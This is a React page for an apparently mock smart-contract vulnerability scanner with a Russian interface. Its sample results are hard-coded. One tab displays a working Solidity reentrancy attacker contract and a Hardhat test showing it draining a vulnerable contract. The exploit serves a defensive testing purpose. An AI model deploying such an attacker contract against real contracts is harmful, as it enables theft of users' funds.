"use client"

import { useState } from "react"
import { AlertTriangle, Code, Download, FileCode, FileText, Info, Search, Zap } from "lucide-react"

import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Textarea } from "@/components/ui/textarea"
import { Badge } from "@/components/ui/badge"
import { SessionNavBar } from "@/components/session-nav-bar"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"

export default function AnalyzePage() {
  const [isAnalyzing, setIsAnalyzing] = useState(false)
  const [showResults, setShowResults] = useState(false)
  const [activeTab, setActiveTab] = useState("upload")

  const handleAnalyze = () => {
    setIsAnalyzing(true)
    // Имитация процесса анализа
    setTimeout(() => {
      setIsAnalyzing(false)
      setShowResults(true)
      setActiveTab("results")
    }, 3000)
  }

  return (
    <div className="flex min-h-screen bg-firmament">
      {/* Sidebar */}
      <SessionNavBar />

      {/* Main Content */}
      <div className="flex-1 p-6 md:p-8 ml-[3.05rem]">
        <header className="mb-8">
          <h1 className="text-3xl font-bold text-autumn">Анализ смарт-контракта</h1>
          <p className="text-autumn-muted mt-2">
            Загрузите смарт-контракт для анализа уязвимостей с помощью глубокого обучения
          </p>
        </header>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="mb-8">
          <TabsList className="bg-firmament-light mb-6">
            <TabsTrigger value="upload" className="text-autumn data-[state=active]:bg-firmament-lighter">
              Загрузка
            </TabsTrigger>
            {showResults && (
              <>
                <TabsTrigger value="results" className="text-autumn data-[state=active]:bg-firmament-lighter">
                  Результаты
                </TabsTrigger>
                <TabsTrigger value="cfg" className="text-autumn data-[state=active]:bg-firmament-lighter">
                  Визуализация CFG
                </TabsTrigger>
                <TabsTrigger value="tests" className="text-autumn data-[state=active]:bg-firmament-lighter">
                  Тесты
                </TabsTrigger>
                <TabsTrigger value="blockchain" className="text-autumn data-[state=active]:bg-firmament-lighter">
                  Блокчейн-аналитика
                </TabsTrigger>
              </>
            )}
          </TabsList>

          <TabsContent value="upload" className="space-y-6">
            <div className="grid gap-6 md:grid-cols-2">
              <Card className="bg-firmament-light border-firmament-lighter">
                <CardHeader>
                  <CardTitle className="text-autumn flex items-center">
                    <FileCode className="mr-2 size-5" />
                    Загрузить файл
                  </CardTitle>
                  <CardDescription className="text-autumn-muted">
                    Загрузите .sol файл для анализа уязвимостей
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="flex flex-col items-center justify-center border-2 border-dashed border-firmament-lighter rounded-lg p-12 text-center">
                    <FileText className="size-12 text-autumn/50 mb-4" />
                    <p className="text-autumn mb-2">Перетащите .sol файл сюда или</p>
                    <Button variant="outline" className="border-firmament-lighter text-autumn">
                      Выбрать файл
                    </Button>
                  </div>
                </CardContent>
              </Card>

              <Card className="bg-firmament-light border-firmament-lighter">
                <CardHeader>
                  <CardTitle className="text-autumn flex items-center">
                    <Code className="mr-2 size-5" />
                    Вставить код
                  </CardTitle>
                  <CardDescription className="text-autumn-muted">Вставьте исходный код смарт-контракта</CardDescription>
                </CardHeader>
                <CardContent>
                  <Textarea
                    placeholder="// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract YourContract {
    // Вставьте код здесь
}"
                    className="min-h-[200px] bg-firmament border-firmament-lighter text-autumn font-mono text-sm"
                  />
                </CardContent>
              </Card>
            </div>

            <Card className="bg-firmament-light border-firmament-lighter">
              <CardHeader>
                <CardTitle className="text-autumn flex items-center">
                  <Search className="mr-2 size-5" />
                  Проверить адрес контракта
                </CardTitle>
                <CardDescription className="text-autumn-muted">
                  Введите адрес развернутого контракта для анализа
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="flex gap-4">
                  <div className="flex-1">
                    <Input placeholder="0x..." className="bg-firmament border-firmament-lighter text-autumn" />
                  </div>
                  <Select defaultValue="ethereum">
                    <SelectTrigger className="w-[180px] bg-firmament border-firmament-lighter text-autumn">
                      <SelectValue placeholder="Выберите сеть" />
                    </SelectTrigger>
                    <SelectContent className="bg-firmament-light border-firmament-lighter text-autumn">
                      <SelectItem value="ethereum">Ethereum</SelectItem>
                      <SelectItem value="bsc">Binance Smart Chain</SelectItem>
                      <SelectItem value="polygon">Polygon</SelectItem>
                      <SelectItem value="arbitrum">Arbitrum</SelectItem>
                      <SelectItem value="optimism">Optimism</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </CardContent>
            </Card>

            <div className="flex justify-end">
              <Button className="bg-demonic hover:bg-demonic/90" onClick={handleAnalyze} disabled={isAnalyzing}>
                {isAnalyzing ? (
                  <>
                    <div className="mr-2 size-4 animate-spin rounded-full border-2 border-autumn border-t-transparent"></div>
                    Анализ...
                  </>
                ) : (
                  <>
                    <Zap className="mr-2 size-4" />
                    Анализировать
                  </>
                )}
              </Button>
            </div>
          </TabsContent>

          <TabsContent value="results" className="space-y-6">
            <div className="grid gap-6 md:grid-cols-3">
              <Card className="bg-firmament-light border-firmament-lighter md:col-span-2">
                <CardHeader className="flex flex-row items-center justify-between pb-2">
                  <div>
                    <CardTitle className="text-autumn">Результаты анализа</CardTitle>
                    <CardDescription className="text-autumn-muted">
                      Обнаружено 5 уязвимостей в TokenSwap.sol
                    </CardDescription>
                  </div>
                  <Button variant="outline" className="border-firmament-lighter text-autumn">
                    <Download className="mr-2 size-4" />
                    Скачать отчет
                  </Button>
                </CardHeader>
                <CardContent>
                  <div className="rounded-md border border-firmament-lighter overflow-hidden">
                    <table className="w-full text-autumn">
                      <thead>
                        <tr className="bg-firmament-lighter">
                          <th className="px-4 py-2 text-left">Тип</th>
                          <th className="px-4 py-2 text-left">Строка</th>
                          <th className="px-4 py-2 text-left">Серьезность</th>
                          <th className="px-4 py-2 text-left">Описание</th>
                          <th className="px-4 py-2 text-left">Действия</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-firmament-lighter">
                        {vulnerabilities.map((vuln, index) => (
                          <tr key={index} className="hover:bg-firmament">
                            <td className="px-4 py-3">{vuln.type}</td>
                            <td className="px-4 py-3">{vuln.line}</td>
                            <td className="px-4 py-3">
                              <Badge className={getSeverityColor(vuln.severity)}>{vuln.severity}</Badge>
                            </td>
                            <td className="px-4 py-3">{vuln.description}</td>
                            <td className="px-4 py-3">
                              <div className="flex gap-2">
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Button variant="ghost" size="icon" className="size-8">
                                        <Info className="size-4 text-autumn" />
                                      </Button>
                                    </TooltipTrigger>
                                    <TooltipContent className="bg-firmament-light border-firmament-lighter text-autumn">
                                      <p>Подробнее</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Button variant="ghost" size="icon" className="size-8">
                                        <Code className="size-4 text-autumn" />
                                      </Button>
                                    </TooltipTrigger>
                                    <TooltipContent className="bg-firmament-light border-firmament-lighter text-autumn">
                                      <p>Исправление</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              </div>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </CardContent>
              </Card>

              <div className="space-y-6">
                <Card className="bg-firmament-light border-firmament-lighter">
                  <CardHeader>
                    <CardTitle className="text-autumn">Рейтинг безопасности</CardTitle>
                    <CardDescription className="text-autumn-muted">Оценка безопасности контракта</CardDescription>
                  </CardHeader>
                  <CardContent className="flex flex-col items-center justify-center">
                    <div className="relative flex items-center justify-center mb-4">
                      <div className="absolute text-4xl font-bold text-autumn">4.2</div>
                      <svg className="size-40" viewBox="0 0 100 100">
                        <circle
                          cx="50"
                          cy="50"
                          r="45"
                          fill="none"
                          stroke="#1A1F38"
                          strokeWidth="10"
                          strokeLinecap="round"
                        />
                        <circle
                          cx="50"
                          cy="50"
                          r="45"
                          fill="none"
                          stroke="#BB2233"
                          strokeWidth="10"
                          strokeLinecap="round"
                          strokeDasharray="282.7"
                          strokeDashoffset="164"
                          transform="rotate(-90 50 50)"
                        />
                      </svg>
                    </div>
                    <p className="text-autumn-muted text-sm mb-4">из 10 возможных</p>
                    <div className="w-full space-y-2">
                      <div className="flex justify-between text-sm">
                        <span className="text-autumn">Критические проблемы</span>
                        <span className="text-demonic">2</span>
                      </div>
                      <div className="flex justify-between text-sm">
                        <span className="text-autumn">Высокие риски</span>
                        <span className="text-atomic">1</span>
                      </div>
                      <div className="flex justify-between text-sm">
                        <span className="text-autumn">Средние риски</span>
                        <span className="text-yellow-500">2</span>
                      </div>
                      <div className="flex justify-between text-sm">
                        <span className="text-autumn">Низкие риски</span>
                        <span className="text-green-500">0</span>
                      </div>
                    </div>
                  </CardContent>
                </Card>

                <Card className="bg-firmament-light border-firmament-lighter">
                  <CardHeader>
                    <CardTitle className="text-autumn">Похожие инциденты</CardTitle>
                    <CardDescription className="text-autumn-muted">Сравнение с известными хаками</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="flex items-start gap-3 p-3 rounded-md bg-firmament">
                      <AlertTriangle className="size-5 text-demonic shrink-0 mt-0.5" />
                      <div>
                        <p className="text-autumn font-medium">DAO Hack (2016)</p>
                        <p className="text-autumn-muted text-sm">Сходство: 85%</p>
                        <p className="text-autumn-muted text-sm mt-1">
                          Уязвимость повторного входа, приведшая к потере $60 млн
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3 p-3 rounded-md bg-firmament">
                      <AlertTriangle className="size-5 text-atomic shrink-0 mt-0.5" />
                      <div>
                        <p className="text-autumn font-medium">Parity Multisig (2017)</p>
                        <p className="text-autumn-muted text-sm">Сходство: 42%</p>
                        <p className="text-autumn-muted text-sm mt-1">
                          Проблема с инициализацией библиотеки, заморозившая $300 млн
                        </p>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="cfg" className="space-y-6">
            <Card className="bg-firmament-light border-firmament-lighter">
              <CardHeader>
                <CardTitle className="text-autumn">Визуализация графа управления потоком (CFG)</CardTitle>
                <CardDescription className="text-autumn-muted">
                  Графическое представление потока выполнения контракта
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="flex justify-center p-4 bg-firmament rounded-md">
                  <div className="text-center">
                    <svg width="600" height="400" viewBox="0 0 600 400" className="mx-auto">
                      {/* Это упрощенная визуализация CFG */}
                      <rect x="250" y="20" width="100" height="50" rx="5" fill="#1A1F38" stroke="#FA8603" />
                      <text x="300" y="45" textAnchor="middle" fill="#FAE3CF" fontSize="12">
                        Вход
                      </text>
                      <text x="300" y="60" textAnchor="middle" fill="#FAE3CF" fontSize="10">
                        constructor()
                      </text>

                      <line x1="300" y1="70" x2="300" y2="100" stroke="#FAE3CF" strokeWidth="2" />
                      <polygon points="295,100 305,100 300,110" fill="#FAE3CF" />

                      <rect x="250" y="110" width="100" height="50" rx="5" fill="#1A1F38" stroke="#FAE3CF" />
                      <text x="300" y="135" textAnchor="middle" fill="#FAE3CF" fontSize="12">
                        Функция
                      </text>
                      <text x="300" y="150" textAnchor="middle" fill="#FAE3CF" fontSize="10">
                        transferFunds()
                      </text>

                      <line x1="300" y1="160" x2="300" y2="190" stroke="#FAE3CF" strokeWidth="2" />
                      <polygon points="295,190 305,190 300,200" fill="#FAE3CF" />

                      <rect x="250" y="200" width="100" height="50" rx="5" fill="#1A1F38" stroke="#FAE3CF" />
                      <text x="300" y="225" textAnchor="middle" fill="#FAE3CF" fontSize="12">
                        Проверка
                      </text>
                      <text x="300" y="240" textAnchor="middle" fill="#FAE3CF" fontSize="10">
                        require()
                      </text>

                      <line x1="300" y1="250" x2="250" y2="280" stroke="#FAE3CF" strokeWidth="2" />
                      <polygon points="245,275 255,285 250,290" fill="#FAE3CF" />

                      <line x1="300" y1="250" x2="350" y2="280" stroke="#FAE3CF" strokeWidth="2" />
                      <polygon points="345,275 355,285 350,290" fill="#FAE3CF" />

                      <rect x="200" y="290" width="100" height="50" rx="5" fill="#1A1F38" stroke="#BB2233" />
                      <text x="250" y="315" textAnchor="middle" fill="#FAE3CF" fontSize="12">
                        Внешний вызов
                      </text>
                      <text x="250" y="330" textAnchor="middle" fill="#FAE3CF" fontSize="10">
                        call()
                      </text>

                      <rect x="300" y="290" width="100" height="50" rx="5" fill="#1A1F38" stroke="#FAE3CF" />
                      <text x="350" y="315" textAnchor="middle" fill="#FAE3CF" fontSize="12">
                        Обновление
                      </text>
                      <text x="350" y="330" textAnchor="middle" fill="#FAE3CF" fontSize="10">
                        balances[msg.sender] = 0
                      </text>

                      <line x1="250" y1="340" x2="250" y2="370" stroke="#FAE3CF" strokeWidth="2" />
                      <polygon points="245,370 255,370 250,380" fill="#FAE3CF" />

                      <line x1="350" y1="340" x2="350" y2="370" stroke="#FAE3CF" strokeWidth="2" />
                      <polygon points="345,370 355,370 350,380" fill="#FAE3CF" />

                      <rect x="200" y="380" width="200" height="50" rx="5" fill="#1A1F38" stroke="#FAE3CF" />
                      <text x="300" y="410" textAnchor="middle" fill="#FAE3CF" fontSize="12">
                        Выход
                      </text>
                    </svg>
                  </div>
                </div>
                <div className="mt-4 flex justify-between">
                  <div className="flex items-center gap-2">
                    <div className="size-3 rounded-full bg-demonic"></div>
                    <span className="text-autumn-muted text-sm">Уязвимые узлы</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="size-3 rounded-full bg-atomic"></div>
                    <span className="text-autumn-muted text-sm">Точки входа</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="size-3 rounded-full bg-autumn"></div>
                    <span className="text-autumn-muted text-sm">Обычные узлы</span>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="tests" className="space-y-6">
            <Card className="bg-firmament-light border-firmament-lighter">
              <CardHeader className="flex flex-row items-center justify-between pb-2">
                <div>
                  <CardTitle className="text-autumn">Автоматически сгенерированные тесты</CardTitle>
                  <CardDescription className="text-autumn-muted">
                    Тесты для проверки найденных уязвимостей
                  </CardDescription>
                </div>
                <Button variant="outline" className="border-firmament-lighter text-autumn">
                  <Download className="mr-2 size-4" />
                  Скачать тесты
                </Button>
              </CardHeader>
              <CardContent>
                <div className="rounded-md bg-firmament p-4 overflow-x-auto">
                  <pre className="text-xs text-autumn-muted">
                    <code>
                      {`// SPDX-License-Identifier: MIT
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("TokenSwap Vulnerability Tests", function () {
  let tokenSwap;
  let owner;
  let attacker;
  let user;

  beforeEach(async function () {
    [owner, attacker, user] = await ethers.getSigners();
    
    const TokenSwap = await ethers.getContractFactory("TokenSwap");
    tokenSwap = await TokenSwap.deploy();
    await tokenSwap.deployed();
    
    // Пополнение контракта
    await tokenSwap.deposit({ value: ethers.utils.parseEther("10") });
  });

  it("Тест на уязвимость повторного входа (Reentrancy)", async function () {
    // Развертывание вредоносного контракта
    const AttackerContract = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await AttackerContract.connect(attacker).deploy(tokenSwap.address);
    
    // Начальный баланс атакующего
    const initialBalance = await ethers.provider.getBalance(attacker.address);
    
    // Атакующий делает депозит
    await attackerContract.connect(attacker).deposit({ value: ethers.utils.parseEther("1") });
    
    // Запуск атаки
    await attackerContract.connect(attacker).attack();
    
    // Конечный баланс атакующего
    const finalBalance = await ethers.provider.getBalance(attacker.address);
    
    // Проверка: атакующий должен получить больше, чем вложил
    expect(finalBalance.sub(initialBalance)).to.be.gt(ethers.utils.parseEther("1"));
  });

  it("Тест на уязвимость целочисленного переполнения", async function () {
    // Код для тестирования уязвимости целочисленного переполнения
    // ...
  });
});`}
                    </code>
                  </pre>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-firmament-light border-firmament-lighter">
              <CardHeader>
                <CardTitle className="text-autumn">Контракт атакующего</CardTitle>
                <CardDescription className="text-autumn-muted">
                  Пример вредоносного контракта для эксплуатации уязвимости
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="rounded-md bg-firmament p-4 overflow-x-auto">
                  <pre className="text-xs text-autumn-muted">
                    <code>
                      {`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVulnerableContract public vulnerableContract;
    
    constructor(address _vulnerableContractAddress) {
        vulnerableContract = IVulnerableContract(_vulnerableContractAddress);
    }
    
    // Функция для атаки
    function attack() external {
        vulnerableContract.withdraw();
    }
    
    // Функция для депозита
    function deposit() external payable {
        vulnerableContract.deposit{value: msg.value}();
    }
    
    // Функция fallback вызывается при получении ETH
    receive() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw();
        }
    }
}`}
                    </code>
                  </pre>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="blockchain" className="space-y-6">
            <Card className="bg-firmament-light border-firmament-lighter">
              <CardHeader>
                <CardTitle className="text-autumn">Блокчейн-аналитика</CardTitle>
                <CardDescription className="text-autumn-muted">Анализ активности контракта в блокчейне</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <Label className="text-autumn mb-2 block">Адрес контракта</Label>
                    <div className="flex items-center gap-2 p-2 rounded-md bg-firmament">
                      <code className="text-autumn-muted text-sm">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</code>
                      <Button variant="ghost" size="icon" className="size-8 ml-auto">
                        <ExternalLink className="size-4 text-autumn" />
                      </Button>
                    </div>
                  </div>

                  <div className="grid gap-4 md:grid-cols-3">
                    <div className="p-4 rounded-md bg-firmament">
                      <p className="text-autumn-muted text-sm mb-1">Баланс</p>
                      <p className="text-autumn text-lg font-medium">5.24 ETH</p>
                    </div>
                    <div className="p-4 rounded-md bg-firmament">
                      <p className="text-autumn-muted text-sm mb-1">Транзакции</p>
                      <p className="text-autumn text-lg font-medium">1,245</p>
                    </div>
                    <div className="p-4 rounded-md bg-firmament">
                      <p className="text-autumn-muted text-sm mb-1">Последняя активность</p>
                      <p className="text-autumn text-lg font-medium">2 часа назад</p>
                    </div>
                  </div>

                  <div>
                    <h3 className="text-autumn font-medium mb-2">Подозрительная активность</h3>
                    <div className="p-4 rounded-md bg-firmament flex items-start gap-3">
                      <AlertTriangle className="size-5 text-demonic shrink-0 mt-0.5" />
                      <div>
                        <p className="text-autumn font-medium">Обнаружены подозрительные транзакции</p>
                        <p className="text-autumn-muted text-sm mt-1">
                          Несколько транзакций с высоким расходом газа и неудачными вызовами, что может указывать на
                          попытки эксплуатации уязвимостей.
                        </p>
                        <div className="mt-2">
                          <Button variant="outline" size="sm" className="border-firmament-lighter text-autumn">
                            Подробный отчет
                          </Button>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h3 className="text-autumn font-medium mb-2">Взаимодействие с другими контрактами</h3>
                    <div className="rounded-md border border-firmament-lighter overflow-hidden">
                      <table className="w-full text-autumn">
                        <thead>
                          <tr className="bg-firmament-lighter">
                            <th className="px-4 py-2 text-left">Адрес контракта</th>
                            <th className="px-4 py-2 text-left">Тип</th>
                            <th className="px-4 py-2 text-left">Количество вызовов</th>
                            <th className="px-4 py-2 text-left">Последний вызов</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-firmament-lighter">
                          <tr className="hover:bg-firmament">
                            <td className="px-4 py-3">0x1f9840a85d...5e40b5</td>
                            <td className="px-4 py-3">Uniswap Router</td>
                            <td className="px-4 py-3">42</td>
                            <td className="px-4 py-3">3 часа назад</td>
                          </tr>
                          <tr className="hover:bg-firmament">
                            <td className="px-4 py-3">0x7a250d5630...2488D</td>
                            <td className="px-4 py-3">Token Contract</td>
                            <td className="px-4 py-3">18</td>
                            <td className="px-4 py-3">5 часов назад</td>
                          </tr>
                          <tr className="hover:bg-firmament">
                            <td className="px-4 py-3">0xc02aaa39b2...06cc38</td>
                            <td className="px-4 py-3">WETH</td>
                            <td className="px-4 py-3">27</td>
                            <td className="px-4 py-3">2 дня назад</td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}

// Примеры данных
const vulnerabilities = [
  {
    type: "Reentrancy",
    line: "45-52",
    severity: "Критическая",
    description: "Внешний вызов перед обновлением состояния",
  },
  {
    type: "Unchecked Return Values",
    line: "78",
    severity: "Высокая",
    description: "Не проверяется возвращаемое значение внешнего вызова",
  },
  {
    type: "Integer Overflow",
    line: "103",
    severity: "Средняя",
    description: "Возможное переполнение при сложении",
  },
  {
    type: "Timestamp Dependence",
    line: "124",
    severity: "Средняя",
    description: "Использование block.timestamp для критических операций",
  },
  {
    type: "Missing Zero Address Check",
    line: "67",
    severity: "Низкая",
    description: "Отсутствует проверка на нулевой адрес",
  },
]

// Вспомогательная функция для цветов серьезности
function getSeverityColor(severity) {
  switch (severity) {
    case "Критическая":
      return "bg-demonic/20 text-demonic border-demonic/30"
    case "Высокая":
      return "bg-atomic/20 text-atomic border-atomic/30"
    case "Средняя":
      return "bg-yellow-500/20 text-yellow-500 border-yellow-500/30"
    case "Низкая":
      return "bg-green-500/20 text-green-500 border-green-500/30"
    default:
      return "bg-autumn/20 text-autumn border-autumn/30"
  }
}

function ExternalLink(props) {
  return (
    <svg
      {...props}
      xmlns="http://www.w3.org/2000/svg"
      width="24"
      height="24"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
      <polyline points="15 3 21 3 21 9" />
      <line x1="10" x2="21" y1="14" y2="3" />
    </svg>
  )
}
